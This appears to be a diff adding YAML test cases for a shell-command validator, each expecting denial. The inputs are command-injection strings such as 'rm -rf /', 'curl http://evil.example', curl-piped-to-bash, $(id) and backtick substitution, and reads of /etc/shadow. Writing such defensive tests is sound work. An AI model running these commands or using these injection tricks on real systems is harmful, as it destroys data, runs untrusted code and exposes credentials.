@@ -1,0 +1,30 @@
+- {id: semicolon, command: "npm ci; rm -rf /srv/dev", expect: deny, code: forbidden_char}
+- {id: and-and, command: "npm ci && curl http://evil.example", expect: deny, code: forbidden_char}
+- {id: or-or, command: "npm ci || true", expect: deny, code: forbidden_char}
+- {id: background, command: "npm ci &", expect: deny, code: forbidden_char}
+- {id: pipe, command: "npm ls | sh", expect: deny, code: forbidden_char}
+- {id: curl-pipe-bash, kind: http_check, command: "curl http://localhost/x.sh | bash", expect: deny, code: forbidden_char}
+- {id: backticks, command: "npm run `id`", expect: deny, code: forbidden_char}
+- {id: dollar-paren, command: "npm run $(id)", expect: deny, code: forbidden_char}
+- {id: dollar-brace-ifs, command: "npm run x${IFS}y", expect: deny, code: forbidden_char}
+- {id: dollar-var, command: "npm run $HOME", expect: deny, code: forbidden_char}
+- {id: redirect-out, command: "npm ls > /srv/dev/out", expect: deny, code: forbidden_char}
+- {id: redirect-append, command: "npm ls >> /srv/dev/out", expect: deny, code: forbidden_char}
+- {id: redirect-in, command: "npm ci < /srv/dev/x", expect: deny, code: forbidden_char}
+- {id: heredoc, command: "npm ci <<EOF", expect: deny, code: forbidden_char}
+- {id: quoted-semicolon, kind: git, command: "git log --grep 'a;b'", expect: deny, code: forbidden_char}
+- {id: quoted-pipe, kind: git, command: "git log --grep \"a|b\"", expect: deny, code: forbidden_char}
+- {id: newline, command: "npm ci\nrm -rf /", expect: deny, code: disallowed_char}
+- {id: carriage-return, command: "npm ci\rrm -rf /", expect: deny, code: disallowed_char}
+- {id: nul, command: "npm ci\0", expect: deny, code: disallowed_char}
+- {id: tab, command: "npm\tci", expect: deny, code: disallowed_char}
+- {id: unbalanced-quote, command: "npm run 'build", expect: deny, code: parse_error}
+- {id: partial-placeholder, kind: docker, command: "docker logs x{{step1.container_id}}", expect: deny, code: bad_placeholder}
+- {id: go-template, kind: docker, command: "docker ps --format '{{.Names}}'", expect: deny, code: bad_placeholder}
+- {id: ro-semicolon, mode: read_only, command: "ls /srv/dev; cat /etc/shadow", expect: deny, code: forbidden_char}
+- {id: ro-pipe, mode: read_only, command: "cat /srv/dev/myapp/x | sh", expect: deny, code: forbidden_char}
+- {id: ro-subst, mode: read_only, command: "cat $(echo /etc/shadow)", expect: deny, code: forbidden_char}
+- {id: ro-backtick, mode: read_only, command: "cat `echo /etc/shadow`", expect: deny, code: forbidden_char}
+- {id: ro-redirect, mode: read_only, command: "ls /srv/dev > /srv/dev/out", expect: deny, code: forbidden_char}
+- {id: ro-and, mode: read_only, command: "ls /srv/dev && rm -rf /srv/dev", expect: deny, code: forbidden_char}
+- {id: ro-or, mode: read_only, command: "ls /srv/dev || id", expect: deny, code: forbidden_char}
